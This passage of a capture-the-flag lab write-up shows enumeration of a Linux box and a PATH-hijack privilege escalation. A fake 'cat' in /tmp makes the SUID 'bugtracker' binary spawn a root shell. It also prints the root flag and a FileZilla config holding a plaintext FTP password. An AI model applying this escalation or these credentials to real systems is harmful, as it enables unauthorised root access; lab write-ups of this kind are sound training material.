Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 reqtimeout_module (shared)
 setenvif_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[-] Installed compilers:
ii  gcc                                   4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-7                                 7.4.0-1ubuntu1~18.04.1                          amd64        GNU C compiler
ii  libllvm9:amd64                        1:9-2~ubuntu18.04.1                             amd64        Modular compiler and toolchain technologies, runtime library
ii  libxkbcommon0:amd64                   0.8.2-1~ubuntu18.04.1                           amd64        library interface to the XKB compiler - shared library


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1617 Jan 24  2020 /etc/passwd
-rw-r--r-- 1 root root 734 Jan 27  2020 /etc/group
-rw-r--r-- 1 root root 581 Apr  9  2018 /etc/profile
-rw-r----- 1 root shadow 1053 Jan 24  2020 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 40152 May 15  2019 /snap/core/7270/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root root 27608 May 15  2019 /snap/core/7270/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7270/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7270/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7270/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jun 10  2019 /snap/core/7270/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 102600 Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7270/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26696 Aug 22  2019 /bin/umount
-rwsr-xr-x 1 root root 43088 Aug 22  2019 /bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 149080 Oct 10  2019 /usr/bin/sudo


[-] SGID files:
-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /snap/core/7270/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /snap/core/7270/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 62336 Mar 25  2019 /snap/core/7270/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36080 Apr  5  2016 /snap/core/7270/usr/bin/crontab
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /snap/core/7270/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 22768 Mar 25  2019 /snap/core/7270/usr/bin/expiry
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/7270/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/7270/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/7270/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 358624 Mar  4  2019 /snap/core/7270/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27368 May 15  2019 /snap/core/7270/usr/bin/wall
-rwsr-sr-x 1 root root 102600 Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /snap/core/8268/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /snap/core/8268/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 62336 Mar 25  2019 /snap/core/8268/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36080 Apr  5  2016 /snap/core/8268/usr/bin/crontab
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /snap/core/8268/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 22768 Mar 25  2019 /snap/core/8268/usr/bin/expiry
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/8268/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/8268/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/8268/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 358624 Mar  4  2019 /snap/core/8268/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27368 Oct 10  2019 /snap/core/8268/usr/bin/wall
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root tty 30800 Aug 22  2019 /usr/bin/wall
-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent


[+] Files with POSIX capabilities set:
/usr/bin/mtr-packet = cap_net_raw+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 144 Jan 23  2020 /etc/kernel-img.conf
-rw-r--r-- 1 root root 6920 Sep 20  2018 /etc/overlayroot.conf
-rw-r--r-- 1 root root 403 Mar  1  2018 /etc/updatedb.conf
-rw-r--r-- 1 root root 3028 Aug  5  2019 /etc/adduser.conf
-rw-r--r-- 1 root root 100 Jun 25  2018 /etc/sos.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 5898 Aug  5  2019 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 92 Apr  9  2018 /etc/host.conf
-rw-r--r-- 1 root root 350 Aug  5  2019 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 10368 Apr  5  2017 /etc/sensors3.conf
-rw-r--r-- 1 root root 2584 Feb  1  2018 /etc/gai.conf
-rw-r--r-- 1 root root 703 Aug 21  2017 /etc/logrotate.conf
-rw-r--r-- 1 root root 1358 Jan 30  2018 /etc/rsyslog.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 552 Apr  4  2018 /etc/pam.conf
-rw-r--r-- 1 root root 513 Aug  5  2019 /etc/nsswitch.conf
-rw-r--r-- 1 root root 2969 Feb 28  2018 /etc/debconf.conf
-rw-r--r-- 1 root root 1260 Feb 26  2018 /etc/ucf.conf
-rw-r--r-- 1 root root 604 Aug 13  2017 /etc/deluser.conf
-rw-r--r-- 1 root root 812 Mar 24  2018 /etc/mke2fs.conf
-rw-r--r-- 1 root root 14867 Oct 13  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 4861 Feb 22  2018 /etc/hdparm.conf
-rw-r--r-- 1 root root 191 Feb  7  2018 /etc/libaudit.conf
-rw-r--r-- 1 root root 2683 Jan 17  2018 /etc/sysctl.conf


[-] Current user's history files:
lrwxrwxrwx 1 robert robert 9 Jan 25  2020 /home/robert/.bash_history -> /dev/null


[-] Location and contents (if accessible) of .bash_history file(s):
/home/robert/.bash_history


[-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root shadow 609 Jan 27  2020 /var/backups/gshadow.bak
-rw------- 1 root root 734 Jan 27  2020 /var/backups/group.bak
-rw------- 1 root root 1617 Jan 24  2020 /var/backups/passwd.bak
-rw------- 1 root shadow 1053 Jan 24  2020 /var/backups/shadow.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug  5  2019 .
drwxr-xr-x 14 root root 4096 Jan 23  2020 ..


### SCAN COMPLETE ####################################
```

First notice that Robert is part of a group called `bugtracker`.  Further down, under the Interesting Files header, we find a `bugtracker` executable:
```bash
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

Interesting!  Running this, we get a prompt to provide bug ID.  Providing it with bug ID `1`, we get
```bash
robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
```

There seem to be two other bugs:
```bash
robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
2
---------------

If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.

ProblemType: Bug
DistroRelease: Ubuntu 16.10
Package: filezilla 3.15.0.2-1ubuntu1
Uname: Linux 4.5.0-040500rc7-generic x86_64
ApportVersion: 2.20.1-0ubuntu3
Architecture: amd64
CurrentDesktop: Unity
Date: Sat May 7 16:58:57 2016
EcryptfsInUse: Yes
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)

robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 3
3
---------------

Hello,

When transferring files from an FTP server (TLS or not) to an SMB share, Filezilla keeps freezing which leads down to very much slower transfers ...

Looking at resources usage, the gvfs-smb process works hard (60% cpu usage on my I7)

I don't have such an issue or any slowdown when using other apps over the same SMB shares.

ProblemType: Bug
DistroRelease: Ubuntu 12.04
Package: filezilla 3.5.3-1ubuntu2
ProcVersionSignature: Ubuntu 3.2.0-25.40-generic 3.2.18
Uname: Linux 3.2.0-25-generic x86_64
NonfreeKernelModules: nvidia
ApportVersion: 2.0.1-0ubuntu8
Architecture: amd64
Date: Sun Jul 1 19:06:31 2012
EcryptfsInUse: Yes
InstallationMedia: Ubuntu 12.04 LTS "Precise Pangolin" - Alpha amd64 (20120316)
ProcEnviron:
 TERM=xterm
 PATH=(custom, user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
---
ApportVersion: 2.13.3-0ubuntu1
Architecture: amd64
DistroRelease: Ubuntu 14.04
EcryptfsInUse: Yes
InstallationDate: Installed on 2013-02-23 (395 days ago)
InstallationMedia: Ubuntu 12.10 "Quantal Quetzal" - Release amd64 (20121017.5)
Package: gvfs
PackageArchitecture: amd64
ProcEnviron:
 LANGUAGE=fr_FR
 TERM=xterm
 PATH=(custom, no user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
ProcVersionSignature: Ubuntu 3.13.0-19.40-generic 3.13.6
Tags: trusty
Uname: Linux 3.13.0-19-generic x86_64
UpgradeStatus: Upgraded to trusty on 2014-03-25 (0 days ago)
UserGroups:

robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 4
4
---------------

cat: /root/reports/4: No such file or directory

robert@oopsie:~$
```

Taking a deeper look at the executable, it is unforunately compiled.  However, the built-in Linux command `strings` helps us to gain at least some knowledge of this:
```
robert@oopsie:~$ strings $(command -v bugtracker)
strings $(command -v bugtracker)
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
strcpy
__isoc99_scanf
__stack_chk_fail
putchar
printf
strlen
malloc
strcat
system
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
------------------
: EV Bug Tracker :
------------------
Provide Bug ID:
---------------
cat /root/reports/
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7697
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
test.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
putchar@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
strcpy@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
concat
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@@GLIBC_2.2.5
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
strcat@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

From the strings gathered here, it looks like it was written in C.  However, we see that it uses the `cat` binary (another built-in command, everyone knows this one!).  What we can do is something very clever: create our own `cat` executable and give it priority in path so that the `bugtracker` command uses this instead!  If our own cat creates a shell of its own, then we will have root privileges!
```bash
robert@oopsie:~$ cd /tmp
cd /tmp
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ echo '/bin/bash' > cat && chmod +x cat
echo '/bin/sh' > cat && chmod +x cat
```

Now running `bugtracker` once more we look to have silent success:
```bash
robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

root@oopsie:/tmp#
```

Indeed, we are now a root user!  We can collect our flag and leave at once.
```bash
root@oopsie:/tmp# whoami
whoami
root
root@oopsie:/tmp# cd /root
cd /root
root@oopsie:/root# ls -A
ls -A
.bash_history  .cache	.gnupg	.profile  root.txt  .viminfo
.bashrc        .config	.local	reports   .ssh
root@oopsie:/root# PATH=$(getconf PATH)
PATH=$(getconf PATH)
root@oopsie:/root# cat root.txt
cat root.txt
af13b0bee69f8a877c3faf667f7beacf
```

--- 

## Notes

I got a little nudge for the final step of this.  But boy, this is a simple solution.  I had never thought of this before, and it is ever-so clever!

Another quick note: because this box used something from the previous box, I had a little look around, especially in this root directory:

```bash
# find . -type f | while IFS= read -r line; do echo "\n\n\033[1;38m$line\033[0;38m"; cat "$line"; done
find . -type f | while IFS= read -r line; do echo "\n\n\033[1;38m$line\033[0;38m"; cat "$line"; done


./.cache/motd.legal-displayed


./root.txt
af13b0bee69f8a877c3faf667f7beacf


./.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# don't put duplicate lines in the history. See bash(1) for more options
# ... or force ignoredups and ignorespace
HISTCONTROL=ignoredups:ignorespace

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "$debian_chroot" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
#if [ -f /etc/bash_completion ] && ! shopt -oq posix; then
#    . /etc/bash_completion
#fi


./.ssh/authorized_keys


./reports/1
Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.


./reports/2
If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.

ProblemType: Bug
DistroRelease: Ubuntu 16.10
Package: filezilla 3.15.0.2-1ubuntu1
Uname: Linux 4.5.0-040500rc7-generic x86_64
ApportVersion: 2.20.1-0ubuntu3
Architecture: amd64
CurrentDesktop: Unity
Date: Sat May 7 16:58:57 2016
EcryptfsInUse: Yes
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)


./reports/3
Hello,

When transferring files from an FTP server (TLS or not) to an SMB share, Filezilla keeps freezing which leads down to very much slower transfers ...

Looking at resources usage, the gvfs-smb process works hard (60% cpu usage on my I7)

I don't have such an issue or any slowdown when using other apps over the same SMB shares.

ProblemType: Bug
DistroRelease: Ubuntu 12.04
Package: filezilla 3.5.3-1ubuntu2
ProcVersionSignature: Ubuntu 3.2.0-25.40-generic 3.2.18
Uname: Linux 3.2.0-25-generic x86_64
NonfreeKernelModules: nvidia
ApportVersion: 2.0.1-0ubuntu8
Architecture: amd64
Date: Sun Jul 1 19:06:31 2012
EcryptfsInUse: Yes
InstallationMedia: Ubuntu 12.04 LTS "Precise Pangolin" - Alpha amd64 (20120316)
ProcEnviron:
 TERM=xterm
 PATH=(custom, user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
---
ApportVersion: 2.13.3-0ubuntu1
Architecture: amd64
DistroRelease: Ubuntu 14.04
EcryptfsInUse: Yes
InstallationDate: Installed on 2013-02-23 (395 days ago)
InstallationMedia: Ubuntu 12.10 "Quantal Quetzal" - Release amd64 (20121017.5)
Package: gvfs
PackageArchitecture: amd64
ProcEnviron:
 LANGUAGE=fr_FR
 TERM=xterm
 PATH=(custom, no user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
ProcVersionSignature: Ubuntu 3.13.0-19.40-generic 3.13.6
Tags: trusty
Uname: Linux 3.13.0-19-generic x86_64
UpgradeStatus: Upgraded to trusty on 2014-03-25 (0 days ago)
UserGroups:


./.local/share/nano/search_history
h1
span
.span
.brand
indexes
www
/var/www/html
Options





./.profile
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n || true


./.viminfo
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq
|2,0,1584711105,,"wq"
:q
|2,0,1584707974,,"q"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# File marks:
'0  7  11  /etc/network/interfaces
|4,48,7,11,1584711105,"/etc/network/interfaces"
'1  8  22  /etc/network/interfaces
|4,49,8,22,1584707974,"/etc/network/interfaces"
'2  8  22  /etc/network/interfaces
|4,50,8,22,1584707974,"/etc/network/interfaces"

# Jumplist (newest first):
-'  7  11  /etc/network/interfaces
|4,39,7,11,1584711105,"/etc/network/interfaces"
-'  8  22  /etc/network/interfaces
|4,39,8,22,1584711090,"/etc/network/interfaces"
-'  8  22  /etc/network/interfaces
|4,39,8,22,1584707974,"/etc/network/interfaces"
-'  1  0  /etc/network/interfaces
|4,39,1,0,1584707788,"/etc/network/interfaces"
-'  1  0  /etc/network/interfaces
|4,39,1,0,1584707788,"/etc/network/interfaces"

# History of marks within files (newest to oldest):

> /etc/network/interfaces
	*	1584711104	0
	"	7	11
	^	7	12
	.	7	11
	+	6	10
	+	7	11


./.config/filezilla/filezilla.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
```

Good to note that there is a username and password in plain text here in this last file we found.